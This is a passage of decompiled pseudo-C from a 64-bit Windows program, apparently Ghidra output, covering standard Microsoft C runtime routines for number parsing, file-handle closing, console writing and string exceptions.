    local_30 = *(pthreadmbcinfo *)(local_28 + 0x2e);
    if ((local_38 != (pthreadlocinfo)PTR_DAT_14001ad00) && ((_DAT_14001ab88 & local_28[0x32]) == 0))
    {
      local_38 = __updatetlocinfo();
    }
    if ((local_30 != (pthreadmbcinfo)PTR_DAT_14001aa80) && ((_DAT_14001ab88 & local_28[0x32]) == 0))
    {
      local_30 = __updatetmbcinfo();
    }
    if ((local_28[0x32] & 2) == 0) {
      local_28[0x32] = local_28[0x32] | 2;
      local_20 = '\x01';
    }
  }
  else {
    local_38 = (pthreadlocinfo)*param_1;
    local_30 = (pthreadmbcinfo)param_1[1];
  }
  if (param_3 != (undefined8 *)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (byte *)0x0) || ((param_4 != 0 && (((int)param_4 < 2 || (0x24 < (int)param_4))))))
  {
    pDVar2 = FUN_140009c00();
    *pDVar2 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    if (local_20 != '\0') {
      local_28[0x32] = local_28[0x32] & 0xfffffffd;
    }
    return 0;
  }
  bVar7 = *param_2;
  uVar6 = 0;
  pbVar5 = param_2 + 1;
  ptVar9 = local_38;
  while( true ) {
    if (*(int *)((longlong)&ptVar9->pctype + 4) < 2) {
      uVar3 = (byte)ptVar9->locale_name[3][bVar7] & 8;
    }
    else {
      uVar1 = FUN_1400129a0((uint)bVar7,8,&local_38);
      uVar3 = (uint)CONCAT62(extraout_var,uVar1);
      ptVar9 = local_38;
    }
    if (uVar3 == 0) break;
    bVar7 = *pbVar5;
    pbVar5 = pbVar5 + 1;
  }
  if (bVar7 == 0x2d) {
    bVar7 = *pbVar5;
    param_5 = param_5 | 2;
    pbVar5 = pbVar5 + 1;
  }
  else if (bVar7 == 0x2b) {
    bVar7 = *pbVar5;
    pbVar5 = pbVar5 + 1;
  }
  if ((((int)param_4 < 0) || (param_4 == 1)) || (0x24 < (int)param_4)) {
    if (param_3 != (undefined8 *)0x0) {
      *param_3 = param_2;
    }
    if (local_20 != '\0') {
      local_28[0x32] = local_28[0x32] & 0xfffffffd;
    }
    return 0;
  }
  if (param_4 == 0) {
    if (bVar7 != 0x30) {
      param_4 = 10;
      goto LAB_140013e08;
    }
    if ((*pbVar5 != 0x78) && (*pbVar5 != 0x58)) {
      param_4 = 8;
      goto LAB_140013e08;
    }
    param_4 = 0x10;
  }
  else if ((param_4 != 0x10) || (bVar7 != 0x30)) goto LAB_140013e08;
  if ((*pbVar5 == 0x78) || (*pbVar5 == 0x58)) {
    bVar7 = pbVar5[1];
    pbVar5 = pbVar5 + 2;
  }
LAB_140013e08:
  do {
    if ((ptVar9->locale_name[3][bVar7] & 4U) == 0) {
      if ((ptVar9->locale_name[3][bVar7] & 0x103U) == 0) {
LAB_140013e76:
        pbVar5 = pbVar5 + -1;
        if ((param_5 & 8) == 0) {
          if (param_3 != (undefined8 *)0x0) {
            pbVar5 = param_2;
          }
          uVar6 = 0;
        }
        else if (((param_5 & 4) != 0) ||
                (((param_5 & 1) == 0 &&
                 ((((param_5 & 2) != 0 && (0x80000000 < uVar6)) ||
                  (((param_5 & 2) == 0 && (0x7fffffff < uVar6)))))))) {
          pDVar2 = FUN_140009c00();
          *pDVar2 = 0x22;
          if ((param_5 & 1) == 0) {
            uVar6 = ((param_5 & 2) != 0) + 0x7fffffff;
          }
          else {
            uVar6 = 0xffffffff;
          }
        }
        if (param_3 != (undefined8 *)0x0) {
          *param_3 = pbVar5;
        }
        if ((param_5 & 2) != 0) {
          uVar6 = -uVar6;
        }
        if (local_20 != '\0') {
          local_28[0x32] = local_28[0x32] & 0xfffffffd;
        }
        return uVar6;
      }
      if ((byte)(bVar7 + 0x9f) < 0x1a) {
        iVar4 = (char)bVar7 + -0x20;
      }
      else {
        iVar4 = (int)(char)bVar7;
      }
      uVar3 = iVar4 - 0x37;
    }
    else {
      uVar3 = (int)(char)bVar7 - 0x30;
    }
    if (param_4 <= uVar3) goto LAB_140013e76;
    uVar8 = (uint)(0xffffffff / (ulonglong)param_4);
    if ((uVar6 < uVar8) || ((uVar6 == uVar8 && (uVar3 <= (uint)(0xffffffff % (ulonglong)param_4)))))
    {
      uVar6 = uVar6 * param_4 + uVar3;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (undefined8 *)0x0) goto LAB_140013e76;
    }
    bVar7 = *pbVar5;
    pbVar5 = pbVar5 + 1;
  } while( true );
}




void FUN_140013f60(byte *param_1,undefined8 *param_2,uint param_3)

{
  if (DAT_14001bbf8 == 0) {
    FUN_140013bd0((longlong *)&PTR_DAT_14001ad10,param_1,param_2,param_3,0);
    return;
  }
  FUN_140013bd0((longlong *)0x0,param_1,param_2,param_3,0);
  return;
}




undefined8 FUN_140013fa0(uint param_1)

{
  ulonglong uVar1;
  DWORD *pDVar2;
  DWORD nStdHandle;
  
  if ((-1 < (int)param_1) && (param_1 < DAT_14001c4cc)) {
    uVar1 = (ulonglong)(param_1 & 0x1f);
    if (((*(byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 + uVar1 * 0x50) & 1) != 0) &&
       (*(longlong *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + uVar1 * 0x50) != -1)) {
      if (DAT_14001a100 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_14001401e;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_14001401e:
      *(undefined8 *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + uVar1 * 0x50) =
           0xffffffffffffffff;
      return 0;
    }
  }
  pDVar2 = FUN_140009c00();
  *pDVar2 = 9;
  pDVar2 = FUN_140009c30();
  *pDVar2 = 0;
  return 0xffffffff;
}




undefined8 FUN_140014070(uint param_1)

{
  DWORD *pDVar1;
  
  if (param_1 == 0xfffffffe) {
    pDVar1 = FUN_140009c30();
    *pDVar1 = 0;
    pDVar1 = FUN_140009c00();
    *pDVar1 = 9;
    return 0xffffffffffffffff;
  }
  if ((-1 < (int)param_1) && (param_1 < DAT_14001c4cc)) {
    if ((*(byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 +
                  (ulonglong)(param_1 & 0x1f) * 0x50) & 1) != 0) {
      return *(undefined8 *)
              ((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + (ulonglong)(param_1 & 0x1f) * 0x50);
    }
  }
  pDVar1 = FUN_140009c30();
  *pDVar1 = 0;
  pDVar1 = FUN_140009c00();
  *pDVar1 = 9;
  FUN_1400072d0(0,0,0,0,0);
  return 0xffffffffffffffff;
}




bool FUN_140014110(uint param_1)

{
  int *piVar1;
  longlong lVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  bool bVar5;
  
  uVar3 = (ulonglong)(param_1 & 0x1f);
  lVar2 = (&DAT_14001c4e0)[(longlong)(int)param_1 >> 5];
  bVar5 = true;
  if (*(int *)(lVar2 + 0xc + uVar3 * 0x50) == 0) {
    _lock(10);
    if (*(int *)(lVar2 + 0xc + uVar3 * 0x50) == 0) {
      uVar4 = FUN_1400132e0(lVar2 + 0x10 + uVar3 * 0x50,4000);
      bVar5 = (int)uVar4 != 0;
      piVar1 = (int *)(lVar2 + 0xc + uVar3 * 0x50);
      *piVar1 = *piVar1 + 1;
    }
    FUN_14000fc60(10);
  }
  if (bVar5) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 0x10 + uVar3 * 0x50));
  }
  return bVar5;
}




void FUN_1400141c0(void)

{
  FUN_14000fc60(10);
  return;
}




void FUN_1400141e0(uint param_1)

{
                    /* WARNING: Could not recover jumptable at 0x000140014204. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 0x10 +
             (ulonglong)(param_1 & 0x1f) * 0x50));
  return;
}




void FUN_140014210(WCHAR param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  UINT CodePage;
  undefined1 auStackY_68 [32];
  WCHAR local_28 [2];
  DWORD local_24;
  CHAR local_20 [8];
  ulonglong local_18;
  
  local_18 = DAT_14001a0b0 ^ (ulonglong)auStackY_68;
  local_28[0] = param_1;
  if (DAT_14001b484 != 0) {
    if (DAT_14001b558 == (HANDLE)0xfffffffffffffffe) {
      __initconout();
    }
    if (DAT_14001b558 == (HANDLE)0xffffffffffffffff) goto LAB_140014320;
    BVar1 = WriteConsoleW(DAT_14001b558,local_28,1,&local_24,(LPVOID)0x0);
    if (BVar1 != 0) {
      DAT_14001b484 = 1;
      goto LAB_1400142fc;
    }
    if (DAT_14001b484 != 2) goto LAB_140014320;
    DVar2 = GetLastError();
    if (DVar2 != 0x78) goto LAB_140014320;
    DAT_14001b484 = 0;
  }
  CodePage = GetConsoleOutputCP();
  DVar2 = WideCharToMultiByte(CodePage,0,local_28,1,local_20,5,(LPCSTR)0x0,(LPBOOL)0x0);
  if (DAT_14001b558 != (HANDLE)0xffffffffffffffff) {
    BVar1 = WriteConsoleA(DAT_14001b558,local_20,DVar2,&local_24,(LPVOID)0x0);
    if (BVar1 != 0) {
LAB_1400142fc:
      __security_check_cookie(local_18 ^ (ulonglong)auStackY_68);
      return;
    }
  }
LAB_140014320:
  __security_check_cookie(local_18 ^ (ulonglong)auStackY_68);
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 FUN_140014340(LPWSTR param_1,byte *param_2,ulonglong param_3,undefined8 *param_4)

{
  undefined4 uVar1;
  ushort uVar2;
  int iVar3;
  undefined6 extraout_var;
  DWORD *pDVar4;
  pthreadlocinfo local_28;
  pthreadmbcinfo local_20;
  DWORD *local_18;
  char local_10;
  
  if ((param_2 != (byte *)0x0) && (param_3 != 0)) {
    if (*param_2 != 0) {
      local_10 = '\0';
      if (param_4 == (undefined8 *)0x0) {
        local_18 = FUN_14000b3d0();
        local_28 = *(pthreadlocinfo *)(local_18 + 0x30);
        local_20 = *(pthreadmbcinfo *)(local_18 + 0x2e);
        if ((local_28 != (pthreadlocinfo)PTR_DAT_14001ad00) &&
           ((_DAT_14001ab88 & local_18[0x32]) == 0)) {
          local_28 = __updatetlocinfo();
        }
        if ((local_20 != (pthreadmbcinfo)PTR_DAT_14001aa80) &&
           ((_DAT_14001ab88 & local_18[0x32]) == 0)) {
          local_20 = __updatetmbcinfo();
        }
        if ((local_18[0x32] & 2) == 0) {
          local_18[0x32] = local_18[0x32] | 2;
          local_10 = '\x01';
        }
      }
      else {
        local_28 = (pthreadlocinfo)*param_4;
        local_20 = (pthreadmbcinfo)param_4[1];
      }
      if (*(int *)((longlong)&local_28->lc_category[0].locale + 4) != 0) {
        uVar2 = FUN_1400101b0((uint)*param_2,&local_28);
        if ((int)CONCAT62(extraout_var,uVar2) == 0) {
          iVar3 = MultiByteToWideChar(local_28->lc_codepage,9,(LPCSTR)param_2,1,param_1,
                                      (uint)(param_1 != (LPWSTR)0x0));
          if (iVar3 != 0) {
            if (local_10 != '\0') {
              local_18[0x32] = local_18[0x32] & 0xfffffffd;
            }
            return 1;
          }
        }
        else {
          iVar3 = *(int *)((longlong)&local_28->pctype + 4);
          if ((((1 < iVar3) && (iVar3 <= (int)param_3)) &&
              (iVar3 = MultiByteToWideChar(local_28->lc_codepage,9,(LPCSTR)param_2,iVar3,param_1,
                                           (uint)(param_1 != (LPWSTR)0x0)), iVar3 != 0)) ||
             (((ulonglong)(longlong)*(int *)((longlong)&local_28->pctype + 4) <= param_3 &&
              (param_2[1] != 0)))) {
            uVar1 = *(undefined4 *)((longlong)&local_28->pctype + 4);
            if (local_10 == '\0') {
              return uVar1;
            }
            local_18[0x32] = local_18[0x32] & 0xfffffffd;
            return uVar1;
          }
        }
        pDVar4 = FUN_140009c00();
        *pDVar4 = 0x2a;
        if (local_10 != '\0') {
          local_18[0x32] = local_18[0x32] & 0xfffffffd;
        }
        return 0xffffffff;
      }
      if (param_1 != (LPWSTR)0x0) {
        *param_1 = (ushort)*param_2;
      }
      if (local_10 != '\0') {
        local_18[0x32] = local_18[0x32] & 0xfffffffd;
      }
      return 1;
    }
    if (param_1 != (LPWSTR)0x0) {
      *param_1 = L'\0';
    }
  }
  return 0;
}




void FUN_1400145a0(LPWSTR param_1,byte *param_2,ulonglong param_3)

{
  FUN_140014340(param_1,param_2,param_3,(undefined8 *)0x0);
  return;
}




void FUN_1400145b0(byte *param_1)

{
  FUN_140013f60(param_1,(undefined8 *)0x0,10);
  return;
}




undefined8 FUN_1400145c0(uint param_1)

{
  byte bVar1;
  BOOL BVar2;
  DWORD DVar3;
  longlong lVar4;
  longlong lVar5;
  HANDLE hObject;
  
  lVar4 = FUN_140014070(param_1);
  if (lVar4 != -1) {
    if (param_1 == 1) {
      bVar1 = *(byte *)(DAT_14001c4e0 + 0xa8);
joined_r0x000140014601:
      if ((bVar1 & 1) != 0) {
        lVar4 = FUN_140014070(2);
        lVar5 = FUN_140014070(1);
        if (lVar5 == lVar4) goto LAB_14001463d;
      }
    }
    else if (param_1 == 2) {
      bVar1 = *(byte *)(DAT_14001c4e0 + 0x58);
      goto joined_r0x000140014601;
    }
    hObject = (HANDLE)FUN_140014070(param_1);
    BVar2 = CloseHandle(hObject);
    if (BVar2 == 0) {
      DVar3 = GetLastError();
      goto LAB_14001463f;
    }
  }
LAB_14001463d:
  DVar3 = 0;
LAB_14001463f:
  FUN_140013fa0(param_1);
  *(undefined1 *)
   ((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 + (ulonglong)(param_1 & 0x1f) * 0x50) = 0;
  if (DVar3 != 0) {
    _dosmaperr(DVar3);
    return 0xffffffff;
  }
  return 0;
}




ulonglong FUN_140014690(uint param_1)

{
  DWORD *pDVar1;
  ulonglong uVar2;
  
  if (param_1 == 0xfffffffe) {
    pDVar1 = FUN_140009c30();
    *pDVar1 = 0;
    pDVar1 = FUN_140009c00();
    *pDVar1 = 9;
    uVar2 = 0xffffffff;
  }
  else if (((int)param_1 < 0) || (DAT_14001c4cc <= param_1)) {
    pDVar1 = FUN_140009c30();
    *pDVar1 = 0;
    pDVar1 = FUN_140009c00();
    *pDVar1 = 9;
    FUN_1400072d0(0,0,0,0,0);
    uVar2 = 0xffffffff;
  }
  else if ((*(byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 +
                     (ulonglong)(param_1 & 0x1f) * 0x50) & 1) == 0) {
    pDVar1 = FUN_140009c30();
    *pDVar1 = 0;
    pDVar1 = FUN_140009c00();
    *pDVar1 = 9;
    FUN_1400072d0(0,0,0,0,0);
    uVar2 = 0xffffffff;
  }
  else {
    FUN_140014110(param_1);
    if ((*(byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 +
                  (ulonglong)(param_1 & 0x1f) * 0x50) & 1) == 0) {
      pDVar1 = FUN_140009c00();
      *pDVar1 = 9;
      uVar2 = 0xffffffff;
    }
    else {
      uVar2 = FUN_1400145c0(param_1);
      uVar2 = uVar2 & 0xffffffff;
    }
    FUN_1400141e0(param_1);
  }
  return uVar2;
}




void FUN_1400147a0(undefined8 param_1,longlong param_2)

{
  FUN_1400141e0(*(uint *)(param_2 + 0x50));
  return;
}




/* Library Function - Single Match
    _freebuf
   
   Library: Visual Studio 2005 Release */

void __cdecl _freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    FUN_14000b9c0(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}




/* Library Function - Single Match
    __initconout
   
   Library: Visual Studio 2005 Release */

void __cdecl __initconout(void)

{
  DAT_14001b558 = CreateFileA("CONOUT$",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  return;
}




/* Library Function - Single Match
    __termcon
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release */

void __termcon(void)

{
  if ((DAT_14001b558 != (HANDLE)0xffffffffffffffff) && (DAT_14001b558 != (HANDLE)0xfffffffffffffffe)
     ) {
    CloseHandle(DAT_14001b558);
  }
  if ((DAT_14001b550 != (HANDLE)0xffffffffffffffff) && (DAT_14001b550 != (HANDLE)0xfffffffffffffffe)
     ) {
    CloseHandle(DAT_14001b550);
  }
  return;
}




void FUN_140014880(undefined8 *param_1)

{
  *param_1 = std::logic_error::vftable;
  if (0xf < (ulonglong)param_1[7]) {
    thunk_FUN_14000b9c0((LPVOID)param_1[4]);
  }
  param_1[7] = 0xf;
  param_1[6] = 0;
  *(undefined1 *)(param_1 + 4) = 0;
  FUN_140007fa0(param_1);
  return;
}




undefined8 * FUN_1400148d0(undefined8 *param_1,uint param_2)

{
  *param_1 = std::logic_error::vftable;
  if (0xf < (ulonglong)param_1[7]) {
    thunk_FUN_14000b9c0((LPVOID)param_1[4]);
  }
  param_1[7] = 0xf;
  param_1[6] = 0;
  *(undefined1 *)(param_1 + 4) = 0;
  FUN_140007fa0(param_1);
  if ((param_2 & 1) != 0) {
    thunk_FUN_14000b9c0(param_1);
  }
  return param_1;
}




void FUN_140014940(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
  local_70 [40];
  undefined **local_48 [3];
  basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
  local_30 [8];
  undefined1 local_28;
  undefined8 local_18;
  undefined8 local_10;
  
  FUN_140003de0(local_70,"string too long");
  FUN_140007e20(local_48);
  local_48[0] = std::logic_error::vftable;
  local_10 = 0xf;
  local_18 = 0;
  local_28 = 0;
  std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::
  assign(local_30,local_70,0,0xffffffffffffffff);
  local_48[0] = std::length_error::vftable;
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_48,(ThrowInfo *)&DAT_140019330);
}




void Unwind_1400149d0(undefined8 param_1,longlong param_2)

{
  FUN_140003e90((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 *)(param_2 + 0x28));
  return;
}




void Unwind_1400149f0(undefined8 param_1,longlong param_2)

{
  FUN_140007fa0((undefined8 *)(param_2 + 0x50));
  return;
}




void FUN_140014a10(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
  local_70 [40];
  undefined **local_48 [3];
  basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
  local_30 [8];
  undefined1 local_28;
  undefined8 local_18;
  undefined8 local_10;
  
  FUN_140003de0(local_70,"invalid string position");
  FUN_140007e20(local_48);
  local_48[0] = std::logic_error::vftable;
  local_10 = 0xf;
  local_18 = 0;
  local_28 = 0;
  std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::
  assign(local_30,local_70,0,0xffffffffffffffff);
  local_48[0] = std::out_of_range::vftable;
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_48,(ThrowInfo *)&DAT_1400194a8);
}




void Unwind_140014aa0(undefined8 param_1,longlong param_2)

{
  FUN_140003e90((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 *)(param_2 + 0x28));
  return;
}




void Unwind_140014ac0(undefined8 param_1,longlong param_2)

{
  FUN_140007fa0((undefined8 *)(param_2 + 0x50));
  return;
}




undefined8 * FUN_140014ae0(undefined8 *param_1,longlong param_2)

{
  FUN_140007ef0(param_1,param_2);
  *param_1 = std::logic_error::vftable;
  param_1[7] = 0xf;
  param_1[6] = 0;
  *(undefined1 *)(param_1 + 4) = 0;
  std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::
  assign((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_> *)
         (param_1 + 3),
         (basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_> *)
         (param_2 + 0x18),0,0xffffffffffffffff);
  *param_1 = std::out_of_range::vftable;
  return param_1;
}




void Unwind_140014b50(undefined8 param_1,longlong param_2)

{
  FUN_140007fa0(*(undefined8 **)(param_2 + 0x40));
  return;
}




/* WARNING: This is an inlined function */
/* Library Function - Single Match
    __chkstk
   
   Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012 */

void __chkstk(void)

{
  undefined1 *in_RAX;
  undefined1 *puVar1;
  undefined1 *puVar2;
  undefined1 local_res8 [32];
  
  puVar1 = local_res8 + -(longlong)in_RAX;
  if (local_res8 < in_RAX) {
    puVar1 = (undefined1 *)0x0;
  }
  if (puVar1 < StackLimit) {
    puVar2 = (undefined1 *)StackLimit;
    do {
      puVar2 = puVar2 + -0x1000;
      *puVar2 = 0;
    } while ((undefined1 *)((ulonglong)puVar1 & 0xfffffffffffff000) != puVar2);
  }
  return;
}




/* Library Function - Single Match
    _CallSettingFrame
   
   Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release */

void _CallSettingFrame(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)FUN_14000f4d0();
  (*pcVar1)();
  FUN_14000f500();
  FUN_14000f4d0();
  return;
}



